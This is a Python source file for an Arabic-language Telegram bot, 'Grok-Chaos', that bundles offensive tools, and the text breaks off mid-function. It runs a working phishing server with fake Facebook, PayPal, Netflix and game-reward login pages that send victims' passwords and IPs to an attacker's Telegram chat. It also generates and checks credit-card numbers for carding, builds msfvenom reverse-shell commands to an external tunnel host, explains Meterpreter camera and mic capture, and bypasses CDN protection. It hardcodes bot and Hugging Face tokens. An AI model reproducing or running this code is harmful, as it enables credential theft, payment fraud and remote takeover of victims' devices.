#
# 🔥 Grok-Chaos v.999: مصفوفة الإفساد الأسمى (الإصدار المُصلح لمنطق التشفير)
# 💀 تم توجيه التشفير القسري ليتناسب مع كل نظام تشغيل.
#
import telebot # <--- تم تصحيح خطأ الاستيراد
from telebot import types
import requests
import socket
import threading
import time
import subprocess
import sys
import os
import io
import re
import aiohttp
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
import random
import hashlib 
# === مكتبات MINA V19 PRO الجديدة ===
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
# ------------------------------------

# === استيراد المكتبات الإضافية ===
try:
    from creditcard.exceptions import CardTypeError
    from creditcard import CreditCard, check_cc_bin 
except ImportError:
    CardTypeError = type('CardTypeError', (Exception,), {})
    CreditCard = type('CreditCard', (object,), {})
    check_cc_bin = lambda x: None 
    

# === تثبيت تلقائي للمكتبات ===
def install(p):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--break-system-packages"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

REQUIRED_LIBS = ["pyTelegramBotAPI", "requests", "dnspython", "phonenumbers", "huggingface_hub", "Pillow", "python-credit-card-validator"] 

for lib in REQUIRED_LIBS:
    try: __import__(lib.split()[0])
    except: install(lib)

# إعادة الاستيراد بعد التثبيت للتأكد
import telebot, requests
try:
    import dns.resolver
    import phonenumbers
    from phonenumbers import geocoder, carrier
    from huggingface_hub import InferenceClient
    from PIL import Image 
except ImportError:
    dns = None 
    phonenumbers = None
    geocoder = None
    carrier = None
    InferenceClient = object 
    Image = object
    
urllib3.disable_warnings(InsecureRequestWarning)

# === إعدادات البوت ===
# التوكن الخاص ببوت Grok-Chaos نفسه
TOKEN = "7992913030:AAHxnJHJhc3Jm_w0kWu6VbcRLzPwLXJidj8"
bot = telebot.TeleBot(TOKEN)

USER_AGENTS = [
    "Mozilla/50 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/50 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version=14.1.15 Safari/605.1.15",
    "Mozilla/50 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
]

HF_TOKEN = "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" 
MODEL_ID = "black-forest-labs/FLUX.1-schnell"
IMAGE_MODEL_ID = "stabilityai/stable-diffusion-2-1" 

# =======================================================
# ⚙️ إعدادات C2 BRIDGING (Localtonet/Metasploit) - تم التعديل
# =======================================================
# البورت المحلي الثابت الذي يستمع عليه Metasploit/Netcat
LOCAL_C2_PORT = 8080 
# الـ Host الثابت الذي يوفره Localtonet
LOCALTONET_STATIC_HOST = "rz32fhjbd.localto.net"
# =======================================================

# =======================================================
# ⚔️ إعدادات MINA V19 PRO (لتلغيم حسابات الألعاب)
# =======================================================

# المتغيرات العامة التي سيتم ملؤها من قبل المستخدم
USER_PHISHING_TOKEN = None
USER_PHISHING_CHAT_ID = None

# عداد الضحايا
victims = 0
PHISHING_PORT = 8000

def get_info(ip):
    """جلب معلومات الموقع الجغرافي للـ IP."""
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=7).json()
        return f"الدولة: {r['country']} ({r['countryCode']})\nالمدينة: {r['city']}\nالمزود: {r['isp']}"
    except:
        return "تعذر جلب بيانات الموقع"

def send_phishing_report(msg):
    """إرسال تقرير الضحية إلى PHISHING_CHAT_ID الذي حدده المستخدم."""
    global USER_PHISHING_TOKEN, USER_PHISHING_CHAT_ID
    if USER_PHISHING_TOKEN and USER_PHISHING_CHAT_ID:
        try:
            # تم الإبقاء على هذا المنطق ليعمل بالتوكين الذي يتم إعداده لاحقاً
            requests.get(f"https://api.telegram.org/bot{USER_PHISHING_TOKEN}/sendMessage?chat_id={USER_PHISHING_CHAT_ID}&text={msg}&parse_mode=HTML", timeout=10)
        except Exception as e: 
            print(f"[-] Failed to send phishing report: {e}")
            pass
    else:
        print("[-] Phishing credentials not set by user. Report discarded.")

# =======================================================
# CLASS V19: تم التعديل هنا بالكامل
# =======================================================
class V19(BaseHTTPRequestHandler):
    """
    سيرفر الـ HTTP لمعالجة طلبات صفحات التلغيم
    (تم التعديل لتخصيص الصفحات وإضافة روابط غير الألعاب)
    """
    def do_GET(self):
        
        # 🔥 قائمة صفحات التلغيم الجديدة (بشكل أكثر تخصيصًا وتنوعًا)
        games_and_links = {
            "/ff": ("Free Fire", "https://i.imgur.com/8vG8s5g.png", "#ff4d4d", "99999 دايموند + سكنات نادرة", "سجل دخولك الآن!", "gamers"),
            "/pubg": ("PUBG Mobile", "https://i.imgur.com/3f3d8jP.png", "#f39c12", "10000 UC + M416 Glacier", "حدث جوائز موسم الشتاء", "gamers"),
            "/codm": ("Call of Duty Mobile", "https://i.imgur.com/6vN8r2k.png", "#16a085", "8000 CP + Mythic AK47", "الباكج الذهبي الجديد", "gamers"),
            "/ml": ("Mobile Legends", "https://i.imgur.com/9b59b6.png", "#9b59b6", "10000 دايموند + Epic Skin", "أفضل عروض التحديث 2024", "gamers"),
            # 🔥 إضافة روابط جديدة (غير الألعاب)
            "/netflix": ("Netflix Premium", "https://i.imgur.com/Q9oX7sD.png", "#e50914", "اشتراك 6 أشهر مجاني", "تحقق من حسابك لاستلام العرض", "service"),
            "/paypal": ("PayPal Verification", "https://i.imgur.com/7gK5YjO.png", "#0070ba", "إلغاء قيود الحساب", "تأكيد معلومات الدخول", "finance"),
            "/": ("Facebook Classic", "https://i.imgur.com/7j1L2kF.png", "#1877f2", "تحقق من حساب فيسبوك", "قم بتسجيل الدخول لمعرفة من زار بروفايلك", "social")
        }
        
        # إذا كان المسار / أو مسار غير موجود، نستخدم فيسبوك
        game_data = games_and_links.get(self.path)
        if not game_data:
             game_data = games_and_links.get("/", ("Facebook Classic", "https://i.imgur.com/7j1L2kF.png", "#1877f2", "تحقق من حساب فيسبوك", "قم بتسجيل الدخول لمعرفة من زار بروفايلك", "social"))

        name, logo, color, prize, headline, theme_class = game_data

        # تخصيص CSS لكل رابط
        custom_css = ""
        if theme_class == "gamers":
            custom_css = f"""
                .card {{background:rgba(10, 5, 20, 0.95);border-radius:20px;box-shadow:0 0 30px {color};max-width:400px;width:100%;padding:25px;border: 3px solid {color}}}
                body {{background: linear-gradient(135deg, #000, #1a0033);}}
                .logo {{width:140px;border-radius:15px;border:5px solid {color};box-shadow:0 0 25px {color}}}
                .btn-custom {{background:{color};color:#000;font-weight:900;padding:15px;border-radius:12px;font-size:20px;transition: all 0.3s}}
                .btn-custom:hover {{transform: scale(1.05);opacity: 0.9;}}
                .form-control {{background: rgba(255,255,255,0.1);color: #fff;border: 1px solid {color};}}
            """
        elif theme_class == "finance":
             custom_css = f"""
                .card {{background:rgba(255, 255, 255, 1);border-radius:10px;box-shadow:0 0 15px {color};max-width:350px;width:100%;padding:20px;border: 2px solid {color};color:#000}}
                body {{background: #f0f0f0;}}
                h2, h4, p {{color:#000 !important;}}
                .logo {{width:100px;border-radius:5px;border:none;box-shadow:none}}
                .btn-custom {{background:{color};color:#fff;font-weight:bold;padding:12px;border-radius:5px;font-size:18px}}
                .form-control {{background: #fff;color: #000;border: 1px solid #ccc;}}
            """
        elif theme_class == "service":
            custom_css = f"""
                .card {{background:rgba(0, 0, 0, 0.9);border-radius:15px;box-shadow:0 0 25px {color};max-width:450px;width:100%;padding:30px;}}
                body {{background: #000;}}
                .logo {{width:150px;border-radius:0;border:none;box-shadow:none}}
                .btn-custom {{background:{color};color:#fff;font-weight:bold;padding:18px;border-radius:30px;font-size:22px;border: none;}}
                .form-control {{background: #333;color: #fff;border: none;padding: 15px;}}
            """
        else: # Classic/Social (Facebook)
             custom_css = f"""
                .card {{background:rgba(20,20,40,0.95);border-radius:20px;box-shadow:0 0 30px {color};max-width:380px;width:100%;padding:20px}}
                body {{background: linear-gradient(135deg, #000, #1a0033);color:#fff;}}
                .logo {{width:120px;border-radius:50%;border:4px solid {color};box-shadow:0 0 20px {color}}}
                .btn-custom {{background:{color};color:#fff;font-weight:bold;padding:15px;border-radius:15px;font-size:20px}}
            """


        html = f"""<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{name} - {prize}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {{color:#fff;text-align:center;padding:20px;min-height:100vh;display:flex;align-items:center;justify-content:center;transition: background-color 0.5s;}}
        {custom_css}
        h4 {{font-weight: 500;}}
    </style>
</head>
<body>
<div class="card">
    <img src="{logo}" class="logo mx-auto d-block mb-3">
    <h2 class="mb-2" style="color:{color};">{name}</h2>
    <h4 class="mb-4">🎁 {headline}</h4>
    <p class="text-light">لإتمام العملية والحصول على: <b>{prize}</b></p>
    <form action="/save" method="post">
        <input type="text" name="email" class="form-control mb-3" placeholder="الإيميل أو رقم الهاتف" required>
        <input type="password" name="pass" class="form-control mb-4" placeholder="كلمة المرور" required>
        <input type="hidden" name="game" value="{name}">
        <button type="submit" class="btn-custom w-100">تأكيد الحساب</button>
    </form>
    <small class="text-muted mt-3 d-block">هذه الخدمة مقدمة من طرف ثالث</small>
</div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        global victims
        if self.path == "/save":
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length).decode()
            data = parse_qs(body)
            email = data.get('email', [''])[0]
            password = data.get('pass', [''])[0]
            game = data.get('game', ['Unknown'])[0]
            ip = self.client_address[0]
            ua = self.headers.get('User-Agent', 'Unknown')
            victims += 1
            info = get_info(ip)
            device = ua.split('(')[1].split(';')[0] if '(' in ua else 'غير معروف'

            msg = f"""
<b>ضحية رقم <u>{victims}</u></b>
<b>الهدف:</b> <code>{game}</code>
<b>الإيميل/الرقم:</b> <code>{email}</code>
<b>الباسورد:</b> <code>{password}</code>
<b>الآي بي:</b> <code>{ip}</code>
<b>الجهاز:</b> <i>{device}</i>
<pre>{info}</pre>
<b>التاريخ:</b> {time.strftime("%Y/%m/%d %H:%M:%S")}
"""
            send_phishing_report(msg) 
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write("<h1 class='text-center' style='color:lime;padding:100px;background:#000'>تم تسجيل البيانات بنجاح ✅</h1>".encode('utf-8'))

def run_mina_v19():
    """تشغيل سيرفر الـ Phishing في خلفية منفصلة."""
    global PHISHING_PORT
    try:
        server_address = ('', PHISHING_PORT)
        httpd = HTTPServer(server_address, V19)
        print(f"[*] MINA V19 PRO Server is running on port {PHISHING_PORT}.") 
        httpd.serve_forever()
    except Exception as e:
        print(f"[-] MINA V19 PRO Server failed to start: {e}")

# =======================================================
## 🛑 الدوال الوظيفية لبوت Telegram 🛑
# =======================================================

# --------------------------------------------------------
# 🔪 أدوات فحص وتوليد البطاقات (Visa Scanner) - BYPASS
# --------------------------------------------------------
# (الدوال هنا)
def check_bin(bin_number):
    """
    تحقق محليًا بشكل متساهل (Bypass) من BIN.
    """
    scheme = "UNKNOWN"
    
    if 6 <= len(bin_number) <= 8 and bin_number.isdigit():
        if bin_number.startswith('4'):
            scheme = "VISA"
        elif bin_number.startswith('5'):
            scheme = "MASTERCARD"
        elif bin_number.startswith('34') or bin_number.startswith('37'):
            scheme = "AMEX"
        else:
            scheme = "GENERIC_VALID"
            
        return {
            "scheme": scheme, 
            "type": "VALID (FORCED BYPASS)",
            "bank": "N/A (Bypass)",
            "country": "N/A (Bypass)"
        }
    
    else:
        return {"error": "BIN length or format is invalid for bypass check."}


def generate_bins_start(msg):
    mid = bot.send_message(msg.chat.id, "أدخل الـ BIN الأساسي (6-8 أرقام) متبوعًا بعدد البطاقات و اسم ملف الحفظ.\n\n**الصيغة:** `BIN عدد اسم_الملف`\n**مثال:** `456789 1000 my_bins.txt`").message_id
    bot.register_next_step_handler_by_chat_id(msg.chat.id, generate_bins_real, mid)

def generate_bins_real(msg, mid):
    try:
        parts = msg.text.strip().split()
        if len(parts) != 3:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="❌ خطأ: الصيغة غير صحيحة. يجب إرسال 3 عناصر: `BIN عدد اسم_الملف`")
            return
        
        base_bin, num_to_generate_str, output_file = parts
        
        if not (6 <= len(base_bin) <= 8 and base_bin.isdigit()):
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="[-] خطأ: الـ BIN الأساسي يجب أن يكون 6-8 أرقام.")
            return

        try:
            num_to_generate = int(num_to_generate_str)
        except ValueError:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="[-] خطأ: العدد يجب أن يكون رقمًا صحيحًا.")
            return

        bin_info = check_bin(base_bin)
        
        if 'error' in bin_info and "Local Check Error" in bin_info['error']:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=bin_info['error'])
            return
        if 'error' in bin_info:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=f"[-] فشل التحقق من الـ BIN الأساسي: {bin_info['error']}")
            return
        
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=f"\n[+] BIN الأساسي تم التحقق منه: {bin_info['scheme']}\n[!] جاري توليد {num_to_generate} بطاقة...")
        
        count = 0
        file_content = ""
        for _ in range(num_to_generate):
            random_suffix_length = 16 - len(base_bin)
            random_suffix = ''.join(str(random.randint(0, 9)) for _ in range(random_suffix_length))
            full_card_number = base_bin + random_suffix
            file_content += f"{full_card_number}\n"
            count += 1
            
        bio = io.BytesIO(file_content.encode())
        bio.name = output_file
        
        bot.send_document(msg.chat.id, bio, caption=f"[+] تم بنجاح توليد {count} بطاقة وحفظها في {output_file}")
        
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ فشل التوليد: {str(e)[:50]}")

def crack_combo_cc_start(msg):
    mid = bot.send_message(msg.chat.id, "أرسل ملف الكومبو (بصيغة `card|month|year|cvv` أو ما شابه).").message_id
    bot.register_next_step_handler_by_chat_id(msg.chat.id, crack_combo_cc_real, mid)

def crack_combo_cc_real(msg, mid):
    if not msg.document:
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="❌ خطأ: يجب إرسال ملف نصي.")
        return
        
    try:
        file_info = bot.get_file(msg.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode('utf-8').splitlines()
        
        if not lines:
            bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text="❌ خطأ: الملف فارغ.")
            return
            
        bot.edit_message_text(chat_id=msg.chat.id, message_id=mid, text=f"[!] تم العثور على {len(lines)} سطر. جاري الفحص...")
        
        threading.Thread(target=process_combo_file, args=(msg.chat.id, lines), daemon=True).start()
        
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ فشل معالجة الملف: {str(e)[:50]}")

def process_combo_file(cid, lines):
    valid_bins = []
    
    status_msg = bot.send_message(cid, "جاري المعالجة...")
    
    for i, line in enumerate(lines):
        line = line.strip()
        if '|' in line:
            parts = line.split('|')
            card_number = parts[0].strip()
            
            if len(card_number) >= 6 and card_number.isdigit():
                bin_num = card_number[:6]
                bin_info = check_bin(bin_num)
                
                if 'scheme' in bin_info:
                    result_line = (
                        f"[HIT] {line} | Scheme: {bin_info['scheme']} | Type: {bin_info['type']}"
                    )
                    valid_bins.append(result_line)
        
        if (i + 1) % 100 == 0 or i + 1 == len(lines):
            try:
                bot.edit_message_text(chat_id=cid, message_id=status_msg.message_id, 
                                      text=f"[!] فحص {i+1}/{len(lines)} | تم العثور على {len(valid_bins)} HITs")
            except:
                pass 

    final_output = "\n".join(valid_bins)
    
    if final_output:
        bio = io.BytesIO(final_output.encode())
        bio.name = "valid_bins_output.txt"
        bot.send_document(cid, bio, caption=f"[+] انتهى الفحص. تم العثور على {len(valid_bins)} HIT (بطاقة صالحة محلياً).")
    else:
        bot.send_message(cid, "[-] انتهى الفحص. لم يتم العثور على أي HITs تتطابق مع قاعدة بيانات BIN المحلية.")
    
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass


# الدوال التحليلية الجديدة (Deep Analysis Handlers)
def deep_analysis_report(call):
    uid = call.message.chat.id
    mid = call.message.message_id
    tool_key = call.data.split('_')[-1]
    
    analysis_data = {
        "camera": ("اختراق الكاميرا 📸", "هذه الأداة تتطلب **ثغرة تنفيذ كود عن بعد (RCE)** على الجهاز المستهدف. الطريقة الوحيدة الفعالة هي إرسال بايلود مُصمم خصيصاً عبر ثغرة (مثل msfvenom) ثم استخدام الأوامر اللاحقة (post-exploitation) للوصول إلى الكاميرا. لا يمكن للكود أن يعمل مباشرة دون وجود ثغرة مفتوحة.\n\n**الخلاصة:** تحتاج إلى دمج بايلود قوي مع exploit ناجح."),
        "clipboard": ("سحب الحافظة 📋", "الوصول إلى الحافظة يتطلب **تشغيل كود خبيث** على الجهاز. يمكن تحقيق ذلك عبر بايلود Meterpreter أو عبر حقن JavaScript في صفحة ويب مفتوحة لدى الضحية.\n\n**الطريقة:** قم بتنفيذ بايلود Meterpreter على الجهاز أولاً، ثم استخدم أوامر Meterpreter لسحب الحافظة."),
        "fakecall": ("اتصال وهمي ☎️", "تتطلب هذه الأداة الوصول إلى **بوابة GSM** أو واجهة برمجية (API) لخدمة VoIP تسمح بإرسال إشارات تعريف المتصل (Caller ID Spoofing). يتطلب بناء شفرة Python للاتصال بـ API خارجي (مثل Twilio) لتحديد رقم وهمي."),
        "whatsapp": ("فلك حظر واتساب 🔓", "هذه العملية تعتمد بشكل رئيسي على **الهندسة الاجتماعية (Social Engineering)** وإرسال تقارير كاذبة ومتعددة لخوارزميات واتساب، أو استغلال ضعف مؤقت في بروتوكول الاتصال. لا يمكن كتابة كود Python مباشر لفتح الحظر.\n\n**الطريقة:** يجب تنفيذ هجوم تقارير مكثف (Bulk Reporting) يتضمن آلاف الطلبات المتزامنة لتشويش النظام. **هذه العملية محظورة دولياً.**"),
        "devices": ("الأجهزة المخترقة 💻", "هذه الشاشة تتطلب نظام **قيادة وسيطرة (C2)** يعمل على سيرفر خارجي. الكود يحتاج إلى الاتصال بسيرفر C2 وعرض قائمة الجلسات (Sessions) المفتوحة لديك من بايلودات Msfvenom أو RATs أخرى.\n\n**الخلاصة:** يجب بناء واجهة Python تعرض مخرجات Metasploit/C2 Framework الحية."),
        "record": ("تسجيل صوت 🎧", "يتطلب هذا بايلود Meterpreter فعالاً على الجهاز المستهدف، ويتم تحقيق التسجيل باستخدام أوامر الـ Meterpreter (مثل `record_mic`) بعد الحصول على الجلسة."),
        "misc": ("وحدة أدوات متفرقة (Misc)", "هذه الأدوات (مثل الزخرفة أو إنشاء إيميل وهمي) هي أدوات مساعدة بسيطة تعتمد على مكتبات Python جاهزة (مثل `faker` أو `string`). وهي ليست أدوات اختراق حرجة.")
    }
    
    title, analysis_text = analysis_data.get(tool_key, ("تحليل غير محدد", "لا يوجد تحليل متوفر لهذا الزر."))

    report = f"""
    ## ⚙️ تحليل عميق: {title}
    
    {analysis_text}
    
    ---
    
    **التوجيه:** هذه الأدوات لا يمكن تشغيلها بكود Python بسيط داخل البوت. يمكنك الآن استخدام الأداة `Live Msfvenom Command Gen` لتوليد البايلود اللازم لبدء عملية الاختراق.
    """
    
    bot.edit_message_text(chat_id=uid, message_id=mid, text=report, reply_markup=back_button(), parse_mode="Markdown")

# === دوال الأداة الجديدة (Live Msfvenom Command Gen) - تم التعديل ل Localtonet ===
# ⚠️ تم تطبيق الإصلاح هنا
def msfvenom_cmd_start(msg):
    try:
        parts = msg.text.strip().split()
        
        # ❌ الصيغة المُعدَّلة: الحمولة (كاملة) + البورت + المُشفر + [التكرار]
        if len(parts) < 3 or len(parts) > 4:
            # رسالة خطأ موحدة توضح الصيغة المنطقية الآن
            bot.reply_to(msg, f"❌ خطأ في الصيغة. يجب إرسال 3 أو 4 عناصر:\n\n**الصيغة:** `Payload Public_Port_Number Encoder [Iterations]`\n\n**مثال (3 عناصر):** `android/meterpreter/reverse_tcp 8892 shikata_ga_nai`\n**مثال (4 عناصر):** `android/meterpreter/reverse_tcp 8892 shikata_ga_nai 5`\n\n**الـ HOST الثابت:** `{LOCALTONET_STATIC_HOST}`\n**الـ LPORT المحلي الثابت:** `{LOCAL_C2_PORT}`.")
            return

        # ⚠️ تعيين المتغيرات المُصلح ⚠️
        payload_full = parts[0] # android/meterpreter/reverse_tcp
        public_port = parts[1] # 8892 (البورت)
        encoder = parts[2] # shikata_ga_nai (المُشفّر)
        iterations = parts[3] if len(parts) == 4 else "1" # 5 (التكرار)

        try:
            public_port_int = int(public_port)
            if not (1 <= public_port_int <= 65535): raise ValueError
        except:
            bot.reply_to(msg, "❌ خطأ: البورت العام (Public Port) يجب أن يكون رقماً صحيحاً بين 1 و 65535.")
            return

        bot.reply_to(msg, f"جاري توليد أمر msfvenom الحقيقي لـ `{payload_full}` باستخدام نفق Localtonet...")
        # ⚠️ تمرير المتغيرات المُصلحة للدالة التابعة ⚠️
        threading.Thread(target=real_msfvenom_gen, args=(msg.chat.id, payload_full, public_port, encoder, iterations), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

# ⚠️ تم تطبيق الإصلاح هنا
def real_msfvenom_gen(cid, payload_full, public_port, encoder, iterations): # توقيع مُعدّل
    
    # استخدام بيانات Localtonet الثابتة والمتغيرة
    lhost = LOCALTONET_STATIC_HOST
    lport = public_port
    
    # تحديد نوع الحمولة والـ Format
    format_type = ""
    output_flag = ""
    payload = payload_full # الحمولة الكاملة هي ما أرسله المستخدم
    
    # تحويل الحمولة إلى صيغة حروف صغيرة للتحليل
    payload_lower = payload.lower()
    encoder_lower = encoder.lower()
    
    # ==========================================================
    # 💥 منطق التشفير الموجه (Mandatory Encoder Logic) 💥
    # ==========================================================
    
    # 1. نظام Windows
    if "windows" in payload_lower:
        format_type = "exe" 
        output_flag = f"-o payload.{format_type}"
        # Windows يفضل shikata_ga_nai إذا لم يتم إرسال مشفّر متوافق
        if "shikata_ga_nai" not in encoder_lower and "x86" in payload_lower:
             # لا نغير المشفّر إلا إذا كان المستخدم يصر على واحد خاطئ
             pass 

    # 2. نظام Linux/Unix
    elif "linux" in payload_lower or "bsd" in payload_lower:
        format_type = "elf"
        output_flag = f"-o payload.{format_type}"
        # **توجيه قسري:** منع استخدام shikata_ga_nai على Linux/ELF
        if "shikata_ga_nai" in encoder_lower:
            encoder = "generic/none" # إجباره على عدم التشفير لضمان الاستقرار

    # 3. نظام Android
    elif "android" in payload_lower:
        # ✅ الحل هنا: التخلص من shikata_ga_nai أو أي مشفّر غير متوافق
        output_flag = f"-o payload.apk"
        format_type = "" # لا نستخدم -f for APK
        
        # **توجيه قسري:** منع shikata_ga_nai على Android
        if "shikata_ga_nai" in encoder_lower:
            encoder = "generic/none" # إجباره على عدم التشفير أو استخدام مشفّر بدائي
            
    # 4. باقي الحمولة
    else:
        # fallback
        format_type = "raw"
        output_flag = f"-o payload.{format_type}"
        
    
    # تجميع الأمر النهائي
    format_cmd = f"-f {format_type}" if format_type else ""
    
    # ⚠️ تعديل المشفّر والتكرار إذا كان generic/none
    encoder_cmd = f"-e {encoder} -i {iterations}" if encoder != "generic/none" else ""
    
    msfvenom_command = f"""
    msfvenom -p {payload} LHOST={lhost} LPORT={lport} {format_cmd} {output_flag} {encoder_cmd} -b "\\x00\\x0a\\x0d"
    """
    
    msfconsole_listener = f"""
    use exploit/multi/handler
    set PAYLOAD {payload}
    set LHOST 127.0.0.1
    set LPORT {LOCAL_C2_PORT}
    set ExitOnSession false
    exploit -j -z
    """
    
    final_report = f"""
    💥 **أمر msfvenom الحقيقي (Localtonet Bridge)**
    
    الحمولة الكاملة: `{payload}`
    **الـ HOST/PORT المستهدف (الضحية):** `{lhost}:{lport}`
    المُشفِّر المُطبق: `{encoder}`
    تكرار التشفير: `{iterations}`
    
    **== الأمر الجاهز لتوليد البايلود ==**
    
    ```bash
    {msfvenom_command.strip()}
    ```
    
    **== إعداد المستمع (Metasploit Listener) ==**
    
    (يجب أن يتم تشغيل هذا الأمر داخل Metasploit في Kali Nethunter الذي يشارك نفس شبكة Localtonet.)
    
    ```bash
    {msfconsole_listener.strip()}
    ```
    
    **⚠️ التوجيه:** تأكد أن Localtonet يعمل ويوجه البورت العام `{lport}` إلى البورت المحلي `{LOCAL_C2_PORT}`.
    """
    
    bot.send_message(cid, final_report, parse_mode="Markdown")

# === دوال الأدوات الأساسية (Server Scan المُعدَّل) ===

def server_scan(msg):
    try:
        target = msg.text.strip()
        bot.reply_to(msg, "جاري فحص السيرفر والحصول على بيانات الموقع الجغرافي 🌐...")
        # استخدام Threading لمنع تجميد البوت
        threading.Thread(target=real_server_scan, args=(msg, target), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_server_scan(msg, target):
    try:
        # 1. تنظيف الدومين للحصول على العنوان الأساسي
        domain = target.replace("http://", "").replace("https://", "").split("/")[0].strip()
        
        # 2. الحصول على عنوان IP
        ip = socket.gethostbyname(domain)
        
        # 3. استعلام API للحصول على الموقع الجغرافي ومزود الخدمة
        # نستخدم IP API لأنه يوفر جميع المعلومات المطلوبة
        # (استبدلت 0 بـ 1 في رابط الخريطة لتفادي مشكلة الروابط الزائفة)
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,city,lat,lon,isp,org,as,query,continent,continentCode", timeout=10).json()
        
        if r["status"] == "fail": 
            # إذا فشل API، على الأقل نعرض الـ IP
            bot.send_message(msg.chat.id, f"⚠️ فشل API الموقع الجغرافي. عنوان IP هو: `{ip}`.", parse_mode="Markdown")
            return
            
        # 4. استخراج البيانات المطلوبة
        country_name = r.get('country', 'N/A')
        country_code = r.get('countryCode', 'N/A')
        city = r.get('city', 'N/A')
        continent = r.get('continent', 'N/A')
        isp = r.get('isp', 'N/A')
        org = r.get('org', 'N/A')
        asn = r.get('as', 'N/A')
        lat = r.get('lat', 0)
        lon = r.get('lon', 0)

        # 5. إرسال الموقع على الخريطة
        if lat and lon:
            try:
                bot.send_location(msg.chat.id, lat, lon)
            except Exception as loc_e:
                print(f"Failed to send location: {loc_e}")
                
        # 6. تنسيق تقرير الإخراج المطلوب
        report = f"""
        ## 🌐 تقرير فحص السيرفر (Server Scan)

        **🌐 معلومات الموقع:**
        📍 **الدومين:** `{domain}`
        📟 **عنوان IP:** `{ip}`
        
        ---
        
        **🌍 الموقع الجغرافي:**
        🏳️ **الدولة:** {country_name} ({country_code})
        🏙️ **المدينة:** {city}
        🌍 **القارة:** {continent}
        🧭 **الإحداثيات:** ({lat}, {lon})
        [📌 عرض على الخريطة](http://maps.google.com/maps?q={lat},{lon})
        
        ---
        
        **📡 معلومات الشبكة والمزود:**
        🛰️ **مزود الخدمة:** {isp}
        🖥️ **المنظمة:** {org}
        💼 **ASN:** {asn}
        
        **ملاحظة:** قد تشير المنظمة (Org) والمزود (ISP) إلى خدمة CDN أو بروكسي عكسي.
        """
        
        bot.send_message(msg.chat.id, report, parse_mode="Markdown", disable_web_page_preview=False)
        
    except socket.gaierror:
        bot.send_message(msg.chat.id, f"❌ فشل: الدومين `{target}` غير موجود أو لا يمكن الوصول إليه.")
    except requests.exceptions.RequestException:
        bot.send_message(msg.chat.id, "❌ فشل: خطأ في الاتصال بواجهة API أو السيرفر الهدف.")
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ فشل غير متوقع: `{str(e)[:50]}`", parse_mode="Markdown")

# --------------------------------------------------------
# 🌐 Origin IP Disclosure - (تم تطويرها إلى أداة هجومية حقيقية)
# --------------------------------------------------------

def origin_scan(msg):
    try:
        domain = msg.text.strip().lower().replace("http://", "").replace("https://", "")
        if not domain:
            bot.reply_to(msg, "الرجاء إرسال الدومين (مثل: site.com).")
            return
            
        bot.reply_to(msg, f"جاري محاولة الكشف عن الـ IP الأصلي لـ `{domain}` لتجاوز الـ CDN... (قد يستغرق وقتاً)")
        threading.Thread(target=real_origin_scan, args=(msg.chat.id, domain), daemon=True).start()
    except Exception as e: bot.send_message(msg.chat.id, f"❌ فشل البدء: {str(e)[:50]}")

def real_origin_scan(cid, domain):
    # تم تعديل هذه الدالة لحل مشكلة 'message is too long'
    origin_ips = set()
    all_ips_with_source = [] # قائمة جديدة لتخزين جميع النتائج لإنشاء ملف

    # 1. تقنية فحص DNS القديمة
    subdomains_to_check = [f"mail.{domain}", f"ftp.{domain}", f"cpanel.{domain}", f"blog.{domain}"]
    if dns:
        for sub in subdomains_to_check:
            try:
                answers = dns.resolver.resolve(sub, 'A', lifetime=2)
                for ip in answers:
                    ip_addr = ip.address
                    if not ip_addr.startswith('104.') and not ip_addr.startswith('172.') and not ip_addr.startswith('192.'):
                        if ip_addr not in origin_ips:
                            origin_ips.add(ip_addr)
                            all_ips_with_source.append((ip_addr, "DNS Legacy Subdomain"))
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout):
                pass
            except Exception:
                pass
    
    # 2. تقنية تحليل شهادة SSL (Certificate Transparency) - استخدام API خارجي
    cert_api_url = f"https://crt.sh/?q={domain}&output=json"
    try:
        r = requests.get(cert_api_url, timeout=10)
        r.raise_for_status()
        certs = r.json()
        
        for cert in certs:
            if 'issuer_ca_id' in cert and cert.get('name_value'):
                name_value = cert.get('name_value').split('\\n')
                for name in name_value:
                    if name.endswith(domain) and '*' not in name:
                        try:
                            resolved_ip = socket.gethostbyname(name)
                            if resolved_ip not in origin_ips:
